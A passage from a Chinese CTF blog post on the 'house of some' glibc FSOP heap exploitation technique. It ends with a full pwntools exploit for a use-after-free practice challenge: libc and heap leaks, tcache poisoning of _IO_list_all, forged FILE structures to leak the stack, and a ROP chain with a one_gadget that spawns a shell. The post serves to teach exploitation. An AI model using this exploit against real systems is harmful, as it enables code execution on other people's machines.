+<li>我们使用创建一个<code>write_chunk</code>和<code>read_chunk</code>,实现任意地址读,将<code>ptr</code>设置为<code>environ</code>,读出stack地址,并使用<code>read_chunk</code>写入一个新的<code>read_chunk</code>,并将这两个已经写入的<code>chunk</code>和未写入的<code>chunk</code>使用<code>chain_</code>按照冲刷顺序连在一起</li>
+<li>创建的新<code>read_chunk</code>将栈地址设置为<code>ptr,</code>实现对<code>read_syscall</code>返回地址的覆盖</li>
+<li>此时三枚结构体冲刷完毕后栈上的<code>ROP</code>可以控制执行流</li>
+</ul>
+<p>将两个普普通通的IO手法穿在一起,组成一个威力巨大的house of手法</p>
+<h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><p>其实除了明确diff了宽字节跳表检查的题目,我们可以在任意版本的libc中使用这个手法</p>
+<p>我随便找了道题,大家可以试试:<a target="_blank" rel="noopener" href="https://content.unauth401.tech/uploads/ichunqiu2024%E5%85%83%E6%97%A6.rar">附件分流</a></p>
+<p>有个uaf,手法很多,主要是练习这个手法吧</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ch</span>(<span class="params">Id</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;&gt; &quot;</span>,<span class="built_in">str</span>(Id).encode())</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">Id,size</span>):</span><br><span class="line">    ch(<span class="number">1</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;Index:&quot;</span>,<span class="built_in">str</span>(Id).encode())</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;what size :&quot;</span>,<span class="built_in">str</span>(size).encode())</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">Id</span>):</span><br><span class="line">    ch(<span class="number">2</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;Index:&quot;</span>,<span class="built_in">str</span>(Id).encode())</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">Id</span>):</span><br><span class="line">    ch(<span class="number">3</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;Index:&quot;</span>,<span class="built_in">str</span>(Id).encode())</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">Id,payload</span>):</span><br><span class="line">    ch(<span class="number">4</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;Index:&quot;</span>,<span class="built_in">str</span>(Id).encode())</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;content: &quot;</span>,payload)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bug</span>():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x500</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x20</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x500</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x20</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">base=u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x219ce0</span></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">heap=u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x290</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;base=&gt;<span class="subst">&#123;<span class="built_in">hex</span>(base)&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;heap=&gt;<span class="subst">&#123;<span class="built_in">hex</span>(heap)&#125;</span>&quot;</span>)</span><br><span class="line"><span class="comment">#------------------------------------------------------------------------</span></span><br><span class="line">_IO_list_all=base+libc.sym._IO_list_all</span><br><span class="line">system=base+libc.sym.system</span><br><span class="line">_IO_file_jumps=base+libc.sym._IO_file_jumps</span><br><span class="line">_IO_wfile_jumps=base+libc.sym._IO_wfile_jumps</span><br><span class="line"><span class="comment">#------------------------------------------------------------------------</span></span><br><span class="line">wide=heap+<span class="number">0xd20</span></span><br><span class="line">environ=base+libc.sym.environ</span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x1000</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;_IO_list_all=&gt;<span class="subst">&#123;<span class="built_in">hex</span>(_IO_list_all)&#125;</span>&quot;</span>)</span><br><span class="line">fake1=flat(&#123;</span><br><span class="line">    <span class="number">0x00</span>:p64(<span class="number">0x800</span> | <span class="number">0x1000</span>),</span><br><span class="line">    <span class="number">0x20</span>:p64(environ),</span><br><span class="line">    <span class="number">0x28</span>:p64(environ+<span class="number">8</span>),</span><br><span class="line">    <span class="number">0x68</span>:p64(wide+<span class="number">0x100</span>),</span><br><span class="line">    <span class="number">0x70</span>:p64(<span class="number">1</span>),</span><br><span class="line">    <span class="number">0xd8</span>:p64(_IO_file_jumps)</span><br><span class="line">    &#125;,filler=<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake2=flat(&#123;</span><br><span class="line">    <span class="number">0x00</span>:p64(<span class="number">0</span>),</span><br><span class="line">    <span class="number">0x20</span>:p64(<span class="number">0</span>),</span><br><span class="line">    <span class="number">0x28</span>:p64(<span class="number">0</span>),</span><br><span class="line">    <span class="number">0x38</span>:p64(wide+<span class="number">0x400</span>),</span><br><span class="line">    <span class="number">0x40</span>:p64(wide+<span class="number">0x700</span>),</span><br><span class="line">    <span class="number">0x68</span>:p64(wide+<span class="number">0x400</span>),</span><br><span class="line">    <span class="number">0x70</span>:p64(<span class="number">0</span>),</span><br><span class="line">    <span class="number">0xa0</span>:p64(wide+<span class="number">0x200</span>),</span><br><span class="line">    <span class="number">0xc0</span>:p64(<span class="number">2</span>),</span><br><span class="line">    <span class="number">0xd8</span>:p64(_IO_wfile_jumps)</span><br><span class="line">    &#125;,filler=<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake=fake1.ljust(<span class="number">0x100</span>,<span class="string">b&#x27;\x00&#x27;</span>)+fake2</span><br><span class="line">wfake=flat(&#123;</span><br><span class="line">    <span class="number">0x20</span>:p64(<span class="number">1</span>),</span><br><span class="line">    <span class="number">0xe0</span>:p64(_IO_file_jumps-<span class="number">0x48</span>)</span><br><span class="line">    &#125;,filler=<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">edit(<span class="number">4</span>,fake.ljust(<span class="number">0x200</span>,<span class="string">b&#x27;\x00&#x27;</span>)+wfake+<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x20</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">key=heap&gt;&gt;<span class="number">12</span></span><br><span class="line">edit(<span class="number">1</span>,p64(key^_IO_list_all))</span><br><span class="line">add(<span class="number">8</span>,<span class="number">0x20</span>)</span><br><span class="line">add(<span class="number">9</span>,<span class="number">0x20</span>)</span><br><span class="line">edit(<span class="number">9</span>,p64(wide))</span><br><span class="line"><span class="comment">#bug()</span></span><br><span class="line">ch(<span class="number">5</span>)</span><br><span class="line">stack=u64(io.recv(<span class="number">8</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;stack=&gt;<span class="subst">&#123;<span class="built_in">hex</span>(stack)&#125;</span>&quot;</span>)</span><br><span class="line">fake2=flat(&#123;</span><br><span class="line">    <span class="number">0x38</span>:p64(stack-<span class="number">0x360</span>),</span><br><span class="line">    <span class="number">0x40</span>:p64(stack-<span class="number">0x260</span>),</span><br><span class="line">    <span class="number">0x70</span>:p64(<span class="number">0</span>),</span><br><span class="line">    <span class="number">0xa0</span>:p64(wide+<span class="number">0x400</span>+<span class="number">0x100</span>),</span><br><span class="line">    <span class="number">0xc0</span>:p64(<span class="number">2</span>),</span><br><span class="line">    <span class="number">0xd8</span>:p64(_IO_wfile_jumps)</span><br><span class="line">    &#125;,filler=<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">wfake=flat(&#123;</span><br><span class="line">    <span class="number">0x20</span>:p64(<span class="number">1</span>),</span><br><span class="line">    <span class="number">0xe0</span>:p64(_IO_file_jumps-<span class="number">0x48</span>)</span><br><span class="line">    &#125;,filler=<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload=fake2.ljust(<span class="number">0x100</span>,<span class="string">b&#x27;\x00&#x27;</span>)+wfake</span><br><span class="line">io.send(payload)</span><br><span class="line">pause()</span><br><span class="line">rsi=base+<span class="number">0x000000000002be51</span></span><br><span class="line">rdx=base+<span class="number">0x00000000000796a2</span></span><br><span class="line">rbp=base+<span class="number">0x000000000002a2e0</span></span><br><span class="line">one=base+<span class="number">0xebc88</span></span><br><span class="line">io.send(p64(rbp)+p64(heap+<span class="number">0x100</span>)+p64(rsi)+p64(<span class="number">0</span>)+p64(rdx)+p64(<span class="number">0</span>)+p64(one))</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>感谢Csome师傅,真是个漂亮到极点的手法啊</p>
+<p>参考:<a target="_blank" rel="noopener" href="https://blog.csome.cc/p/house-of-some/#FSOP%EF%BC%81">house of some</a></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+      
+      
+      
+      
+      
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/%E5%AE%89%E5%85%A8/" rel="tag">安全</a></li></ul>
+
+
+    </footer>
+  </div>
+  
+  <nav id="article-nav" data-aos="fade-up">
+    
+    
+    
+    <div class="article-nav-link-wrap article-nav-link-right">
+      
+        
+        
+          <img data-src="/covers/erj.jpg" data-sizes="auto" alt="MiniLCTF 2023" class="lazyload">
+        
+      
+      <a href="/2025/05/15/mini/"></a>
+      <div class="article-nav-caption">后一篇</div>
+      <h3 class="article-nav-title">
+        
+          MiniLCTF 2023
+        
+      </h3>
+    </div>
+    
+  </nav>
+
+
+</article>
+
+
+
+
+
+
+
+
+
+
+</section>
+        </div>
+        <footer id="footer">
+  <div style="width: 100%; overflow: hidden">
+    <div class="footer-line"></div>
+  </div>
+  <div id="footer-info">
+    
+    <div>
+      <span class="icon-copyright"></span>
+      
+      
+      
+        2020-2025
+      
+      <span class="footer-info-sep rotate"></span>
+      zer00ne
+    </div>
+    
+      <div>
+        基于&nbsp;<a href="https://hexo.io/" rel="noopener external nofollow noreferrer" target="_blank">Hexo</a>&nbsp;
+        Theme.<a href="https://github.com/D-Sketon/hexo-theme-reimu" rel="noopener external nofollow noreferrer" target="_blank">Reimu</a>
+      </div>
+    
+    
+      <div>
+        <span class="icon-brush"></span>
+        12k
+        &nbsp;|&nbsp;
+        <span class="icon-coffee"></span>
+        00:51
+      </div>
+    
+    
+    
+    
+      <div>
+        <span class="icon-eye"></span>
+        <span id="busuanzi_container_site_pv">总访问量&nbsp;<span id="busuanzi_value_site_pv"></span></span>
+        &nbsp;|&nbsp;
+        <span class="icon-user"></span>
+        <span id="busuanzi_container_site_uv">总访客量&nbsp;<span id="busuanzi_value_site_uv"></span></span>
+      </div>
+    
+  </div>
+</footer>
+
+        
+          <div class="sidebar-top">
+            <div class="sidebar-top-taichi rotate"></div>
+            <div class="arrow-up"></div>
+          </div>
+        
+        <div id="mask" class="hide"></div>
+      </div>
+      <nav id="mobile-nav">
+  <div class="sidebar-wrap">
+    
+      
+        <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">文章目录</h3>
+  <div class="sidebar-toc-wrapper toc-div-class" >
+      
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#House-of-some"><span class="toc-number">1.</span> <span class="toc-text">House of some</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.1.</span> <span class="toc-text">前言:</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-number">1.2.</span> <span class="toc-text">原理</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E4%BB%BB%E6%84%8F%E5%9C%B0%E5%9D%80%E8%AF%BB"><span class="toc-number">1.2.1.</span> <span class="toc-text">1.任意地址读</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E9%93%BE"><span class="toc-number">1.2.1.1.</span> <span class="toc-text">利用链</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#IO%E7%BB%93%E6%9E%84%E4%BD%93%E4%BC%AA%E9%80%A0"><span class="toc-number">1.2.1.2.</span> <span class="toc-text">IO结构体伪造</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%BB%E6%84%8F%E5%9C%B0%E5%9D%80%E5%86%99"><span class="toc-number">1.2.2.</span> <span class="toc-text">任意地址写</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%BC%E5%90%88%E5%88%A9%E7%94%A8"><span class="toc-number">1.2.3.</span> <span class="toc-text">综合利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%80%E7%BB%88%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95"><span class="toc-number">1.2.4.</span> <span class="toc-text">最终利用手法</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98"><span class="toc-number">1.3.</span> <span class="toc-text">例题</span></a></li></ol></li></ol>
+      
+  </div>
+</div>
+</div>
+        <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.webp" data-sizes="auto" alt="zer00ne" class="lazyload">
+  <div class="sidebar-author-name">zer00ne</div>
+  <div class="sidebar-description"></div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">6</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">0</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">3</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+</div>
+<div class="sidebar-menu">
+  
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归档"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="关于"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+    
+  
+</div>
+</div>
+      
+    
+  </div>
+  
+    
+      <div class="sidebar-btn-wrapper">
+        <div class="sidebar-toc-btn current"></div>
+        <div class="sidebar-common-btn"></div>
+      </div>
+    
+  
+</nav>
+
+    </div>
+    
+    
+    
+    
+<script src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js" integrity="sha384-3gT&#x2F;vsepWkfz&#x2F;ff7PpWNUeMzeWoH3cDhm&#x2F;A8jM7ouoAK0&#x2F;fP&#x2F;9bcHHR5kHq2nf+e" crossorigin="anonymous"></script>
+
+
+<script src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js" integrity="sha384-J08i8An&#x2F;QeARD9ExYpvphB8BsyOj3Gh2TSh1aLINKO3L0cMSH2dN3E22zFoXEi0Q" crossorigin="anonymous"></script>
+
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+  
+<script src="/js/aos.js"></script>
+
+  <script>
+    var aosInit = () => {
+      AOS.init({
+        duration: 1000,
+        easing: "ease",
+        once: true,
+        offset: 50,
+      });
+    };
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', aosInit);
+    } else {
+      aosInit();
+    }
+  </script>
+
+
+
+<script src="/js/pjax_script.js" data-pjax></script>
+
+
+
+
+
+
+
+  
+<script src="https://npm.webcache.cn/mouse-firework@0.1.1/dist/index.umd.js" integrity="sha384-8LyaidD9GPxQQgLJO&#x2F;WRw&#x2F;O2h3BoNq&#x2F;ApI&#x2F;ecpvM6RsrCz2qP2ppBXUKihP4V&#x2F;2d" crossorigin="anonymous"></script>
+
+  <script>
+    window.firework && window.firework(JSON.parse('{"excludeElements":["a","button"],"particles":[{"shape":"circle","move":["emit"],"easing":"easeOutExpo","colors":["var(--red-1)","var(--red-2)","var(--red-3)","var(--red-4)"],"number":20,"duration":[1200,1800],"shapeOptions":{"radius":[16,32],"alpha":[0.3,0.5]}},{"shape":"circle","move":["diffuse"],"easing":"easeOutExpo","colors":["var(--red-0)"],"number":1,"duration":[1200,1800],"shapeOptions":{"radius":20,"alpha":[0.2,0.5],"lineWidth":6}}]}'))
+  </script>
+
+
+
+
+
+  <script>
+    function initLive2d() {
+      live2d.init("https://fastly.jsdelivr.net/gh/D-Sketon/plugin-live2d/", {themeTipsPath: ""});
+    }
+  </script>
+  
+<script src="https://fastly.jsdelivr.net/gh/D-Sketon/plugin-live2d/js/live2d-autoload.js" onload="initLive2d &amp;&amp; initLive2d()" async></script>
+
+
+
+
+
+
+
+<div id="lazy-script">
+  <div>
+    
+      
+      
+      <script data-pjax>
+        window.REIMU_POST = {
+          author: "zer00ne",
+          title: "house of some",
+          url: "https://khighl.github.io.git/2025/05/15/house_of_some/",
+          excerpt: "",
+          description: "",
+          stripContent: "House of some前言: 在22年,roderick01师傅发现了hosue of apple手法,宽字节跳表攻击几乎成为了每位pwn手的必备技能.house of apple2更是以简单的模板,极高的效率成为了传播范围,利用效率最高的IO攻击手法 之所以house of apple2有效是因为glibc没有对wide_data结构体中的跳表指针进行范围的检查,但是我们通过_IO_wfile_overflow调用位于wide_data(0x68)处的任意函数指针(system,one_g",
+          date: "Thu May 15 2025 00:00:00 GMT+0800",
+          updated: "Wed May 21 2025 01:09:18 GMT+0800",
+          cover: "/images/banner.webp",
+        };
+      </script>
+       
+    
+    
+      
+        
+<script src="/js/insert_highlight.js" data-pjax></script>
+
+        
+      
+    
+    
+      <script type="module" data-pjax>
+        const PhotoSwipeLightbox = (await safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe-lightbox.esm.min.js", "sha384-DiL6M/gG+wmTxmCRZyD1zee6lIhawn5TGvED0FOh7fXcN9B0aZ9dexSF/N6lrZi/")).default;
+        
+        const pswp = () => {
+          if (_$$('.article-entry a.article-gallery-item').length > 0) {
+            new PhotoSwipeLightbox({
+              gallery: '.article-entry',
+              children: 'a.article-gallery-item',
+              pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+            }).init();
+          }
+          if(_$$('.article-gallery a.article-gallery-item').length > 0) {
+            new PhotoSwipeLightbox({
+              gallery: '.article-gallery',
+              children: 'a.article-gallery-item',
+              pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+            }).init();
+          }
+          window.lightboxStatus = 'done';
+          window.removeEventListener('lightbox:ready', pswp);
+        }
+        if(window.lightboxStatus === 'ready') {
+          pswp()
+        } else {
+          window.addEventListener('lightbox:ready', pswp);
+        }
+      </script>
+      
+        
+
+
+
+
+
+
+
+
+      
+    
+  </div>
+</div>
+
+
+  <script>
+    console.log(String.raw`%c 
+ ______     ______     __     __    __     __  __    
+/\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
+\ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
+ \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
+  \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
+                                                  
+`,'color: #ff5252;')
+    console.log('%c Theme.Reimu v' + '1.8.0' + ' %c https://github.com/D-Sketon/hexo-theme-reimu ', 'color: white; background: #ff5252; padding:5px 0;', 'padding:4px;border:1px solid #ff5252;')
+  </script>
+  
+
+
+
+  
+<script src="https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js" integrity="sha384-0M75wtSkhjIInv4coYlaJU83+OypaRCIq2SukQVQX04eGTCBXJDuWAbJet56id+S" crossorigin="anonymous" async></script>
+
+
+
+
+<script>
+  if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.getRegistrations().then((registrations) => {
+      for (let registration of registrations) {
+        registration.unregister();
+      }
+    });
+  }
+</script>
+
+
+
+
+
+
+
+
+
+    
+  </body>
+  </html>
+
